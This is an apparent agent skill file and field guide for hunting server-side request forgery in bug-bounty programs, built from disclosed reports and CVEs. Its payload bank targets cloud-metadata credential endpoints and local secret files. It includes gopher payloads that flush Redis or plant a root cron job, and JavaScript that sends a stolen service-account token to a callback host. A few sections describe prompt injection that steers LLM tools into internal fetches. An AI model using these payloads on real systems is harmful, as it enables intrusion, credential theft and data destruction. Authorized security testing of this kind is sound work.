---
name: hunt-ssrf
description: >-
  Comprehensive SSRF hunting skill — discovery, OOB confirmation, advanced
  bypass, source review, and escalation. Draws on 337 disclosed HackerOne
  reports (bounty stats, 85-payload bank, ffuf/nuclei commands, wordlists)
  plus an advanced-bypass guide (IPv6 transition NAT64/6to4/Teredo, 0.0.0.0/[::]
  aliasing, parser differentials, host.docker.internal/*.svc, allowlist
  bypasses, CDN edge path-normalization, Istio jwksUri, IMDSv2/Azure header
  injection, half-blind SSRF, forwarded-header rewriting, JDBC/Redis/Mongo
  connection-string SSRF, Docker Engine API, gopher CRLF smuggling, static
  DNS CNAME) and 34 curated case studies with a source-review methodology
  (request-path modeling, sink inventory, evidence grading E0–E5, agentic/MCP
  tool inventory, 2025–2026 CVEs). Use whenever hunting SSRF, reviewing source
  for SSRF, or triaging an SSRF finding — especially when obvious payloads
  are already blocked and a bypass or stronger evidence bar is needed.
metadata:
  sources: hackerone_public, github, portswigger_research, binarysecurity_research
  report_count: 337 + 34
---

# SSRF Hunting — Complete Field Guide

Merged from three skill sets covering **337 disclosed HackerOne reports** (2014–2026) plus **34 curated case studies**. The document is organized as a workflow: **find it → confirm it (OOB) → classify it (blind/full-read) → bypass the guard → model the source → escalate → report**.

**Core principle, applies throughout:** OOB confirmation (Burp Collaborator / interactsh) is mandatory before reporting blind SSRF. Any bypass section is only relevant *after* a URL-fetching primitive is confirmed.

---

## Signal (from 337 disclosed HackerOne reports)

- Reports: **337** · paid: **105**
- Median bounty **$700** · p90 **$4,263** · max **$25,000** · total **$178,859**
- Median upvotes **22**
- Corpus: `~/.local/share/hackerone-reports/`

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---:|---:|---:|
| HackerOne | 7 | $31,500 | 931 |
| Dropbox | 2 | $22,489 | 662 |
| GitLab | 18 | $19,750 | 1582 |
| Internet Bug Bounty | 7 | $16,043 | 217 |
| Mail.ru | 36 | $15,150 | 1549 |
| Open-Xchange | 15 | $10,250 | 396 |
| Lark Technologies | 5 | $8,000 | 539 |
| LY Corporation | 5 | $6,050 | 250 |

### Crown jewel targets

SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes, microservice meshes, internal APIs). Prioritize:

- **Cloud-hosted SaaS products** — GCP metadata `metadata.google.internal` / `169.254.169.254`, AWS IMDSv1/IMDSv2, Azure IMDS
- **Kubernetes/orchestration platforms** — aggregated API servers, metrics-server, kubelet endpoints expose privileged cluster operations
- **Internal developer tooling** — CI/CD, workflow orchestration (Flyte, Argo), admin panels not exposed externally
- **Link preview / URL fetching features** — Reddit-style preview APIs, Slack-style unfurling, media processors
- **Dataset / file import pipelines** — anything that fetches remote URLs on behalf of a user
- **Enterprise self-hosted software** — GitHub Enterprise, GitLab — SSRF frequently chains to RCE via internal services
- **Agentic / LLM toolchains** — fetch tools, browser navigation, RAG document loaders, workflow HTTP nodes, MCP server discovery
- **Headless browsers** (Puppeteer, PhantomJS) used for screenshots / PDF — extremely high value

---

## OOB-Or-It-Didn't-Happen Gate (read first)

**Claims of blind SSRF require an out-of-band (OOB) confirmation. Always. No exceptions.**

OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canarytoken, or any DNS+HTTP receiver you control that confirms the server actually made an outbound network connection on your behalf.

### What is NOT confirmation of SSRF

- The server **echoing your URL back in an error message** (e.g. `"The Web application at http://evil.example.com/x could not be found"`) — this is string formatting, not network failure.
- A different status code for an external URL vs `localhost` — could come from URL-scheme validators, not actual fetches.
- A delayed response when a URL is sent — delay can come from DNS resolution attempts within the parser, not completed HTTP fetches.

### What IS confirmation of SSRF

- A DNS lookup for your unique Collaborator subdomain appears in the OOB listener.
- An HTTP request to your Collaborator HTTP endpoint with the server's source IP and User-Agent.
- For SSRF in JavaScript-execution contexts (PDF renderers, headless browsers), a fetch from the server to your callback URL.

### Default workflow

1. **Plant the Collaborator payload first.** Sub-tagging (`dlsrcurl.<collab>`, `import.<collab>`) only works if your listener actually reports the queried subdomain back — **verify before relying on it.** Burp's `get_collaborator_interactions` keys results by **payload ID, not subdomain**, so several sub-tags generated from one payload are indistinguishable. When that's the case, **generate a fresh payload per candidate parameter** and send exactly one request per payload.
2. **Send the request** to the target endpoint.
3. **Wait 30–120 seconds**, then poll the OOB listener.
4. **Only after a confirmed callback** do you claim SSRF.
5. If zero callbacks across all sub-tagged sinks: retract all SSRF claims, even if error messages echo URLs.

### Real lessons (retain these — they save failed reports)

**Lesson A (SharePoint):** `/_layouts/15/download.aspx?SourceUrl=` returned 500 with title `"The Web application at <attacker-URL> could not be found"`. Initial scan flagged this as SSRF. **38 Collaborator-tagged payloads across 12+ URL-accepting parameters yielded zero DNS or HTTP interactions.** The "echo" was client-side error-string formatting; the server never made an outbound request. The path is an SP-internal `SPFile`/`SPWebApplication` resolver, not a generic URL fetcher. Reporting this would have been N/A'd.

**Lesson B (parameter attribution):** A server-side request-forwarding endpoint accepted both `url` and `apiUrl`. The app's own stored config used `apiUrl` — the obvious suspect — but `apiUrl` was inert and **`url` was the live sink**. Batch-firing both produced callbacks with no attribution. Only per-payload isolation identified the real parameter.

```
BAD — four candidate fields, one payload, fired in one batch
-> callbacks arrive, attribution impossible, retest required

GOOD — fresh payload per field, one request each, poll between
url -> callbacks <- this is the sink
apiUrl -> none
endpoint -> none
target -> none
```

**Run the negative control.** A parameter that produces *no* callback is evidence and belongs in the report — it lets the client fix the right field instead of allowlisting the wrong one.

### Blind vs full-read — establish which before scoring

After a callback confirms the request leaves the server, **check whether the upstream response body is returned to you.**

- **Blind** (callback only, no body): on the never-submit list standalone. Needs an internal service reached, or data returned, to be reportable.
- **Full-read** (upstream body in the response): substantially higher severity — read arbitrary internal endpoints directly.
- **Half-blind**: body isn't returned, but content leaks via error messages, async event objects, logs, or a rendered document (see §4.9).

```bash
# one request settles it: fetch something with a known, recognisable body
-d '{"url":"https://example.com/"}'
# {"statusCode":200,"data":"<!doctype html>...<title>Example Domain</title>..."}
#                          ^ body returned = full-read, not blind
```

Also body-diff a known-internal target against a known-external one. A distinct status on a link-local address (e.g. 401 from 169.254.169.254 where every other target returns 200) is the metadata service answering — that proves reach to a non-internet-routable address, which a status code alone otherwise cannot.

---

## Part 1 — Discovery: where SSRF lives

### 1.1 Functionality that makes outbound requests

Any feature where the server fetches a resource on the app's behalf is a candidate:

**URL-accepting parameters** — anything taking a URL, link, image, file, or "source" the server fetches:
- avatar/profile-picture-by-URL, "import from URL"
- RSS/feed readers, link unfurling/preview (Slack-style)
- webhooks (registering + "test" features)
- PDF/document generators that accept a URL or render HTML with remote resources
- screenshot/thumbnail services
- SSO/SAML metadata URL fields, OAuth redirect_uri / discovery endpoints
- "share this page" / social-card generators

**File upload/import pipelines** that fetch remote content:
- SVG/image processors that resolve external entities or xlink:href
- document converters (DOCX/PDF) that follow embedded remote references
- CSV/data importers with a "from URL" option
- API integrations ("connect your data source", "test connection" for DB/cache/webhook — see §4.11)

**Hidden/indirect fetchers** — things that don't look like "enter a URL":
- XML parsers (XXE → SSRF via external entities)
- server-side templating that resolves includes
- PDF renderers executing JS/CSS that references external URLs
- markdown/wiki renderers that fetch remote images for caching
- "report a broken link"/URL validators
- OpenGraph/metadata scrapers
- webhooks for CI/CD or issue trackers
- cloud/edge functions that proxy a user-supplied URL (see §4.15)
- LLM/agent toolchains where a tool fetches a URL from model output or untrusted "documentation" (prompt-injection-driven SSRF — see §4.4–4.5)

**Multi-tenant / cloud-native surfaces** — service mesh control planes (Istio jwksUri, §4.7), Kubernetes admission webhooks, CI pipeline integrations, Docker/container platforms with management APIs (§4.12).

### 1.2 Parameter wordlist

When fuzzing for hidden SSRF-prone parameters (Arjun, Burp Intruder, ffuf):

```
url, uri, link, href, src, source, target, dest, destination, redirect,
redirect_uri, return, returnTo, next, continue, callback, callback_url,
webhook, webhook_url, feed, rss, path, file, filename, filepath, folder,
host, hostname, domain, port, ip, address, proxy, fetch, load, import,
api_url, endpoint, service_url, data, reference, document, avatar, image,
image_url, thumbnail, preview, media, download, upload_url, out, to, page
```

Parameters observed in disclosed reports: `url, hash, username, template, password, id, data, payload, alt, format, email, month, year, template[], image, name, target, start, command, user_id`.

### 1.3 Attack surface signals

URL patterns to hunt:

```
/api/*/preview    /api/*/fetch      /api/*/import     /api/*/webhook
/api/*/proxy      /api/*/render     /api/*/link       /api/*/screenshot
/api/*/export     /api/*/validate
?url= ?uri= ?endpoint= ?redirect= ?src= ?source= ?feed= ?host=
?target= ?dest= ?file= ?path= ?callback= ?image= ?load= ?fetch=
```

JS patterns (grep client-side bundles):

```javascript
fetch(userInput)
axios.get(params.url)
XMLHttpRequest + variable URL
url: req.body.url
src: params.source
href: query.endpoint
```

Response header signals:

```
X-Forwarded-For headers echoed back
Server: internal-service
Via: 1.1 internal-proxy
X-Cache headers revealing internal hostnames
```

Tech stack signals (higher likelihood of payoff):
- Kubernetes — aggregated APIs, metrics endpoints
- GCP — Compute Engine/GKE URL fetchers
- Node.js/Python using requests, node-fetch, axios
- Headless browsers used for screenshots/PDF
- XML/DSPL/CSV import features — XXE-style SSRF
- OAuth/webhook registration endpoints

### 1.4 First payloads (before reaching for advanced bypasses)

```
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://metadata.google.internal/computeMetadata/v1/
```

If any of these work outright, you likely don't need any advanced bypass. If all are blocked, move to Part 4.

Also test both HTTP and HTTPS variants, and try protocol smuggling (`gopher://`, `dict://`, `file://`, `ftp://`) if the fetcher is a generic library (curl, Guzzle, requests) rather than a hardened HTTP-only client.

---

## Part 2 — Payload bank

85+ curated payloads grouped by context. Try in order, stop at the first hit, then minimize. These are seeds — not a substitute for understanding the sink.

### 2.1 Loopback & internal services

```
http://127.0.0.1/
http://127.0.0.1:80/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://127.1/
http://127.0.1/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://127.0.0.1.nip.io/
http://127.0.0.1.sslip.io/
http://localtest.me/
http://localhost.localdomain/
http://localhost./
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://127.0.0.1:22/
http://127.0.0.1:6379/
http://127.0.0.1:11211/
http://127.0.0.1:9200/
http://127.0.0.1:8080/
http://127.0.0.1:3000/
http://127.0.0.1:8500/v1/catalog/services
http://127.0.0.1:6443/api/v1/namespaces    # kube-apiserver
http://127.0.0.1:10250/pods                # kubelet
http://127.0.0.1:2379/v2/keys              # etcd
http://127.0.0.1:9090/                     # Prometheus
http://127.0.0.1:5601/                     # Kibana
```

### 2.2 Cloud metadata

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}    # ECS task

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# OpenStack / DigitalOcean / Aliyun
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/openstack/latest/meta_data.json
http://100.100.100.200/latest/meta-data/
http://192.0.0.192/latest/meta-data/
```

### 2.3 Allowlist & parser bypass (basic)

```
http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/
http://127.0.0.1@169.254.169.254/
http://169.254.169.254#@127.0.0.1/
http://169.254.169.254%2f@127.0.0.1/
http://127.0.0.1:80@evil.com/
http://evil.com:80@127.0.0.1/
http://127.0.0.1%00.evil.com/
http://127.0.0.1%20.evil.com/
http://127.0.0.1.attacker.com/
http://attacker.com#@127.0.0.1/
http://attacker.com?@127.0.0.1/
http://127.0.0.1./
http://127.0.0.1:80\@evil.com/
//127.0.0.1/
\\127.0.0.1\
http://evil.com\@127.0.0.1/
http://127.0.0.1%09.evil.com/
http://127.0.0.1%0d%0a.evil.com/
```

### 2.4 Redirect & DNS tricks

```
http://attacker.com/redirect?url=http://169.254.169.254/
https://attacker.com/302?to=http://127.0.0.1/
http://attacker.com/open?next=http://metadata.google.internal/
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/
http://metadata.google.internal.nip.io/
http://spoofed.burpcollaborator.net/
http://127.0.0.1.sslip.io/
```

### 2.5 Non-HTTP schemes

```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
ftp://127.0.0.1/
sftp://127.0.0.1/
ldap://127.0.0.1/
tftp://127.0.0.1/
netdoc:///etc/passwd
jar:http://127.0.0.1/x.jar!/
php://filter/convert.base64-encode/resource=index.php
expect://id
```

### 2.6 Protocol smuggling (gopher / redis / memcached / SMTP)

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0D%0A%0A%2A%2F%2A%20%2A%20%2A%20%2A%20%2A%20root%0D%0A
gopher://127.0.0.1:11211/_stats%0D%0A
gopher://127.0.0.1:11211/_set%20x%200%200%201%0D%0Aa%0D%0A
gopher://127.0.0.1:25/_EHLO%20localhost%0D%0A
gopher://127.0.0.1:3306/_
gopher://127.0.0.1:5432/_
gopher://127.0.0.1:9000/_
```

### 2.7 IPv6 transition / NAT64 / 6to4 / Teredo (post-basic guards)

```
# NAT64 embedding 169.254.169.254
http://[64:ff9b::a9fe:a9fe]/
# 6to4 embedding 127.0.0.1
http://[2002:7f00:0001::]/
# Teredo (client IPv4 XORed with 0xFFFFFFFF in last 32 bits)
http://[2001:0000:...]/
# Unspecified → loopback
http://0.0.0.0:8080/
http://[::]:8080/
http://0:0:0:0:0:0:0:0/
```

### 2.8 Non-IP internal hostnames

```
http://host.docker.internal:8080/
http://kubernetes.default.svc/
http://metadata.google.internal/
http://<service>.internal/
http://<service>.corp/
http://<service>.local/
http://192.168.65.7:2375/containers/json          # Docker Desktop Engine
http://host.docker.internal:2375/version
```

### 2.9 Redirect-server PoC (when direct is blocked)

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()
```

### 2.10 JavaScript-execution context payloads (headless / PDF)

```javascript
// Exfil via fetch
fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {
  headers: {'Metadata-Flavor': 'Google'}
}).then(r=>r.text()).then(d=>{
  fetch('https://YOUR.callback.com/?d='+btoa(d))
})

// DNS exfil for blind contexts
var x = new XMLHttpRequest();
x.open('GET','http://169.254.169.254/latest/meta-data/');
x.send();
x.onload = function(){
  var img = new Image();
  img.src = 'https://'+btoa(x.responseText.substring(0,50))+'.YOUR.callback.com';
}
```

### 2.11 App-layer input-encoding bypass

When the endpoint takes the target URL wrapped/encoded — a base64 blob in the path, a double-encoded param, a JSON-nested value — the front-end WAF/allowlist inspects the raw input while the backend decodes before fetching. Encode the internal target so the filter never sees 169.254/localhost:

```
GET /proxy/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=/x.js          # base64 = http://169.254.169.254/  (reports/1189367)
url=http%253A%252F%252F169.254.169.254%252F                 # double URL-encode
```

Test whether the parameter is decoded once, twice, or base64'd before the fetch — the number of decode passes is the bug.

### 2.12 Path-normalization / semicolon bypass

When a front-end blocks `url=` to internal hosts but the origin re-normalizes path segments the edge left intact — inject `;/`, `/../`, or matrix-param segments so the edge routes it as benign but the origin resolves the SSRF fetch:

```
GET /;/;/resource/md/get/url?url=http://oast.example/       # edge ignores, origin fetches (reports/2035332)
```

---

## Part 3 — Classification: full-read, blind, half-blind

After OOB confirms the request fires, classify what you actually have (see the OOB gate for the definition test):

- **Full-read SSRF** — response body (or part) is reflected to you. Highest value: read internal services / metadata directly.
- **Blind SSRF** — request fires (OOB confirmed) but nothing comes back in the response. Still exploitable (port scanning via timing/error differences, protocol smuggling, write-only targets like Redis).
- **Half-blind SSRF** — HTTP body isn't returned, but content leaks via error messages, async event objects, logs, or a rendered document (see §4.9). Don't classify a request as "pure blind" just because the body is empty.

For blind/half-blind, differentiate timing even without OOB: closed port, filtered port, and open-but-non-HTTP port (Redis/Memcached) each produce distinguishable error messages or response times — useful for internal port scanning once you have any SSRF primitive.

---

## Part 4 — Bypass techniques

### 4.0 Gate 0 baseline checks (before reaching for exotic vectors)

- Does the guard parse the URL at the same layer/parser as the actual fetcher? If the parameter passes through any decoding or normalization before the fetch (path-segment base64, double URL-encoding, JSON nesting, a `normalize()`-style helper), test host resolution under at least two decode passes — validator/fetcher disagreement is the root cause of several 2025 CVEs (§4.3).
- Does the guard's "private IP" definition include IPv6 transition addresses, `0.0.0.0`, `::`, and link-local — not just 127.0.0.0/8, ::1, and RFC1918? Most guards only check the first set (§4.1, §4.2).
- If the HTTP response body isn't returned, does content leak elsewhere — error messages, async job/event objects, logs, or a rendered PDF/image? (§4.9).
- Are custom request headers controllable? (webhook tester, API debugger, integration config). If so, IMDSv2 and Azure's `Metadata: true` requirement may not actually be a protection (§4.8).

### 4.1 IPv6 transition addresses embedding internal IPv4

Guards that only recognize `::ffff:`, `fe80::`, and `::1` miss IPv4 embedded in transition prefixes. On a NAT64/DNS64 network (common in IPv6-only/IPv6-first clouds), these look "public IPv6" to `is_private()`/`is_global()` but the stack routes them to the embedded private IPv4.

```
# NAT64 embedding 169.254.169.254
http://[64:ff9b::a9fe:a9fe]/
# 6to4 embedding 127.0.0.1
http://[2002:7f00:0001::]/
# Teredo (client IPv4 XORed with 0xFFFFFFFF in last 32 bits)
http://[2001:0000:...]/
```

Bypassed ToolHive, TREK, and others. Also see pyLoad-ng CVE-2026-48737 (§4.19).

### 4.2 0.0.0.0 and [::] — unspecified addresses that resolve to loopback

On Linux, `0.0.0.0` as a destination routes to local loopback, and `[::]` routes to `[::1]`. Most guards check 127.0.0.0/8/localhost but not 0.0.0.0/8 or ::/128 — threat model is "block loopback," but these are classified as unspecified, not loopback, while behaving as loopback.

```
http://0.0.0.0:8080/
http://[::]:8080/
http://0:0:0:0:0:0:0:0/
```

Real cases: new-api stayed bypassable via 0.0.0.0 after CVE-2025-59146/62155 fixes; imgproxy CVE-2025-24354 still reached localhost via 0.0.0.0 even with loopback blocking; local-deep-research missed `::`, `0::`, `::0` variants entirely.

### 4.3 Parser differentials (validator vs fetcher disagree on the host)

**4.3.1 Backslash / control-byte confusion.** `urllib.parse.urlparse` and `urllib3`/`requests` parse `http://127.0.0.1\@1.1.1.1` differently — one extracts `1.1.1.1` (passes validation), the other connects to `127.0.0.1`. Fix: reject backslashes/control bytes/whitespace and extract the host with the same parser the HTTP client uses.

```
http://127.0.0.1\@attacker.com/
http://127.0.0.1%09@attacker.com/
http://127.0.0.1%00.attacker.com/
```

**4.3.2 Percent-encoded host / normalize() bugs.** Same class as CVE-2025-1211 but in different functions (e.g. Hackney's `hackney_url:normalize/2`). Don't stop at one `url=` form — test the host under multiple decode passes if the param goes through any pre-processing. Also see Angular CVE-2026-50168 (§4.19).

### 4.4 Non-IP internal hostnames

Guards that are purely IP-regex-based miss these entirely:

- `host.docker.internal` — reaches the Docker host from a container
- `kubernetes.default.svc` — in-cluster K8s API DNS name
- `*.internal` / `*.corp` / `*.local` — enterprise internal DNS suffixes
- `metadata.google.internal` — GCP metadata short name (often ignored even when 169.254.169.254 is blocked)

Exploited via Apify MCP's fetch-apify-docs and FlowiseAI's API-chain component, where attacker-supplied fake "API documentation" (via prompt injection) set a BASE URL redirecting to `host.docker.internal:8080` or an internal `.local` host. Most hunters stop after 169.254.169.254 and never try these — in containerized/orchestrated environments they're often less filtered than IPs.

### 4.5 Allowlist string-prefix bypasses

For naive checks like `ALLOWED_DOMAINS.some(d => url.startsWith(d))`:

```
# Suffix injection
https://docs.trusted.com.evil.com/payload
# Userinfo injection — trusted domain appears before @, real target is after
https://docs.trusted.com@evil.com/payload
```

Increasingly seen in LLM toolchains/API chains, where prompt injection forges "documentation" to steer a BASE URL rather than directly controlling a URL parameter. Also LangChain CVE-2026-26019/27795 (§4.19).

### 4.6 CDN / edge path-normalization bypasses

Edge platforms (Cloudflare Workers, Vercel Edge, Netlify Functions) normalize URLs differently from the origin — a path segment the edge treats as a static asset gets re-normalized by the origin into an external request. Example: OpenNext's `@opennextjs/cloudflare` `/cdn-cgi/image/` handler.

```
https://victim-site.com/cdn-cgi/image/aaaa/https://attacker.com/...
```

Same class as `;/` and `/../` path-confusion, but the carrier is the edge's image/resize handler. When the target runs on an edge platform, test the edge handler path itself, not just app-layer params.

### 4.7 Service mesh: Istio jwksUri and Envoy header leakage

**Istio `RequestAuthentication.jwksUri`.** When a RequestAuthentication resource's jwksUri points internally, istiod makes an unauthenticated GET with no localhost/link-local filtering, and the result can be distributed via xDS to every sidecar in the mesh.

```yaml
jwksUri: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Envoy metadata leakage.** Headers like `x-envoy-peer-metadata`, `x-envoy-peer-metadata-id`, or `server: envoy` on a blind SSRF response confirm you've entered an Istio mesh and leak Pod/service identity. If policy allows the final hop, probe `/config_dump` to pull full mesh config (routes, clusters, secrets).

### 4.8 Bypassing IMDSv2 / Azure Metadata via header injection

IMDSv2 normally requires a PUT for a token then `X-aws-ec2-metadata-token`. CVE-2025-64709 (Typebot) bypassed this where a webhook/HTTP-request component let the attacker control arbitrary headers — the attacker just injected the token header directly and pulled the EKS node role's IAM credentials, leading to cluster takeover. Azure IMDS needs `Metadata: true`; the ChatGPT Custom Actions SSRF named an attacker-controlled API-key header `Metadata` with value `true`, combined with a 302 redirect to bypass the HTTPS requirement.

Generalize: any feature allowing arbitrary outbound headers (webhook tester, API debugger, integration config) may neutralize IMDSv2/Azure protections.

### 4.9 Half-blind SSRF — response surfaces outside the body

Distinct from the blind/full-read binary: the HTTP body isn't returned, but content leaks via error messages, async event objects, logs, or a rendered document.

- CVE-2025-13281 (Kubernetes Portworx): kube-controller-manager's GET response leaked into a `ProvisioningFailed` event object — attacker couldn't control the request body but could read the response.
- PDF/rendering pipelines that execute JS can draw internal response content into the returned PDF/image — the document becomes the exfil channel.

When the body comes back empty, check: does an error echo internal-response fragments? Do `kubectl get events` show the provisioner's response? Does a returned PDF/image contain internal text?

### 4.10 Forwarded-header URL reconstruction

Astro's `createRequest()` builds URLs from unsanitized `x-forwarded-proto`/`x-forwarded-port`. Injecting a protocol-layer payload rewrites the whole URL (host/port/path) while stuffing the real host/path into the query string, so routing looks unaffected:

```
x-forwarded-proto: https://www.malicious-url.com/?tank=
# constructed: https://www.malicious-url.com/?tank=://localhost/ssr
```

This doubles as a middleware/protected-route bypass and a cache-poisoning vector. Applies to any SSR framework building URLs from `X-Forwarded-*` headers (Astro, Next.js, Nuxt, Remix) — test these headers as SSRF vectors, not just `?url=`.

### 4.11 Connection-string SSRF (JDBC / Redis / Mongo / LDAP) with file-read escalation

Any "test connection"/"data source config" feature accepting JDBC/Redis/Mongo/LDAP URLs is a blind-SSRF + potential file-read dual vector. Dinky (≤1.2.5) and SpringBlade's `testConnect`: attacker supplies a MySQL JDBC URL, probes internal hosts/ports via driver error timing (SSRF/port-scan), then sets `allowLoadLocalInfile=true` to abuse `LOAD DATA LOCAL INFILE` and read arbitrary files (configs, private keys) off the app host:

```
jdbc:mysql://internal-host:3306/test?allowLoadLocalInfile=true
```

### 4.12 Docker Engine API as an internal SSRF target

Docker Desktop CVE-2025-9074 (CVSS 9.3): the Docker Engine API is reachable unauthenticated from inside a container at `http://192.168.65.7:2375/`, even with Enhanced Container Isolation on — enabling container creation and host filesystem access. Most SSRF port-scan lists only include 127.0.0.1/169.254.169.254, not this address.

```
http://192.168.65.7:2375/containers/json
http://host.docker.internal:2375/version
```

### 4.13 Gopher CRLF smuggling (curl doesn't sanitize the selector)

curl's gopher implementation doesn't sanitize `%0d%0a` in the selector path, letting you inject arbitrary TCP commands into Redis/Memcached/SMTP even when the SSRF only allows gopher and the selector is assumed "safe":

```
gopher://127.0.0.1:11211/_Dummy%0d%0aHELLO_SERVER%0d%0a
```

Test whether CRLF in the selector decodes to raw bytes — on an old or curl-based HTTP client this can lead directly to Redis `CONFIG SET`/`SAVE`/authorized_keys writes → RCE.

### 4.14 Static DNS CNAME to metadata/internal (no rebinding race needed)

A simpler, more stable alternative to DNS-rebinding TOCTOU: register a CNAME pointing directly at a metadata IP or internal hostname.

```
attacker.com.       CNAME  metadata.google.internal.
evil.attacker.com.  A      169.254.169.254
```

If the guard resolves once and checks the IP, the CNAME returns the internal address on first resolution. If the guard checks the hostname string, the CNAME looks like a normal external domain. Try static CNAME before escalating to rebinding (TTL=0 + race).

### 4.15 Cloud / Edge Function: SSRF + cross-tenant write combo

Multi-tenant SaaS Edge Functions can have both an SSRF (fetch a user-supplied URL) and a cross-tenant write (store the result in an arbitrary workspace). Example: a Supabase-backed "zip my submission files" Edge Function fetched an attacker URL and wrote the archive into an arbitrary workspace's storage folder. When you find a URL input in a cloud/Edge Function, also check where the fetched result gets written — if that path is also user-controlled, blind SSRF escalates to cross-tenant data write/overwrite.

### 4.16 DNS rebinding (when static CNAME isn't possible)

- Validate URL → sleep → redirect to internal (race between DNS validation and fetch)
- Register a domain with 0-TTL, rotate DNS between validation and fetch calls
- Use https://lock.cmpxchg8b.com/rebinder.html to prototype

Real cases: Concrete CMS (H1 #1369312), GitLab UrlBlocker, Azure DevOps endpointproxy (Binary Security).

### 4.17 TOCTOU — the root pattern

Any guard that resolves once, checks the IP, then hands the hostname to a normal HTTP client is a strong signal. The HTTP stack will resolve again at connect time — that second resolution is the bypass. Correct implementations pin the already-approved address to the actual connect call. When you see "DNS check then `requests.get()`", suspect rebinding or redirect-based bypass.

### 4.18 Quick reference table — advanced vectors

| Vector | Why hunters miss it | Minimal payload |
|---|---|---|
| NAT64/6to4/Teredo embedding IPv4 | Guards only check `::ffff:`/`fe80::` | `http://[64:ff9b::a9fe:a9fe]/` |
| 0.0.0.0 / [::] | Classed as unspecified, not loopback | `http://0.0.0.0:8080/` |
| Backslash/control-byte parser diff | Only IP encodings tested | `http://127.0.0.1\@attacker.com/` |
| host.docker.internal / *.svc / *.internal | Guards only block IP literals | `http://host.docker.internal:8080/` |
| startsWith() allowlist bypass | Only param values tested, not domain strings | `https://docs.trusted.com.evil.com/` |
| CDN edge /cdn-cgi/image/ path confusion | Only app params tested | `https://victim.com/cdn-cgi/image/x/https://attacker.com/` |
| Istio jwksUri | Only app layer tested, not control-plane resources | `jwksUri: http://169.254.169.254/...` |
| IMDSv2/Azure header injection | Assumes IMDSv2 unbypassable | Webhook header named `Metadata` / `X-aws-ec2-metadata-token` |
| Half-blind (events/errors/documents) | Gives up when body is empty | Check `ProvisioningFailed` events / returned PDF |
| x-forwarded-proto URL rewrite | Only ?url= tested, not headers | `x-forwarded-proto: https://evil.com/?x=` |
| JDBC allowLoadLocalInfile | Treats "test connection" as blind-only | `jdbc:mysql://...?allowLoadLocalInfile=true` |
| Docker 192.168.65.7:2375 | Port-scan lists omit Docker Desktop internal IP | `http://192.168.65.7:2375/containers/json` |
| Gopher CRLF not sanitized | Assumes gopher selector is safe | `gopher://127.0.0.1:6379/_%0d%0aCONFIG...` |
| Static CNAME → metadata | Jumps straight to rebinding | `evil.com CNAME metadata.google.internal` |
| App-layer base64/double-encode | Only ?url= plain tested | `/proxy/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=/` |
| ;/ path-confusion | Only app params tested | `/;/;/resource/md/get/url?url=http://oast/` |

### 4.19 Non-HTTP protocol checklist

Beyond gopher, check what protocols the actual fetch library supports, not just what the feature's UI implies:

- `file://` and local-resource handlers (local file read via a feature that only looks like it does HTTP)
- legacy `ftp://` handlers
- XML external entities / external document references (XXE escalating straight into SSRF)
- archive and media-library URL handlers that fetch nested resources
- custom SDK schemes and browser custom-protocol/embedded-resource handlers

A validator that only checks `http(s)://` doesn't mean the underlying library can't be reached with another scheme — test scheme handling explicitly as its own axis, separate from host/IP bypasses.

**Verified 2025–2026 CVEs / advisories:**

| Reference | Root-cause lesson |
|---|---|
| CVE-2026-45310 — CodeWhale/DeepSeek TUI | Initial URL checked, but client followed redirects without re-applying destination policy (same as §4.8/§4.10 redirect gap) |
| CVE-2026-33626 — LMDeploy | Vision-language image_url loading path fetched remote URLs without adequate destination validation — confirms §5.5 "LLM media loader" sink class |
| CVE-2026-50168 — Angular platform-server | WHATWG URL and lenient Domino parser disagreed during SSR → allowlist bypass — textbook parser differential (§4.3) |
| CVE-2026-26019 / CVE-2026-27795 — LangChain Community | Same-origin check used string-prefix comparison (§4.5 startsWith() bypass); a later fix was itself bypassed via redirects |
| CVE-2026-48737 — pyLoad-ng | Global-address classifier missed IPv6 transition-address cases — same class as §4.1 (NAT64/6to4), reachability depends on host's NAT64/6to4 routing |
| CVE-2026-57126 — PraisonAI | Literal-host checks ran before hostname resolution, leaving DNS-based destination validation incomplete |
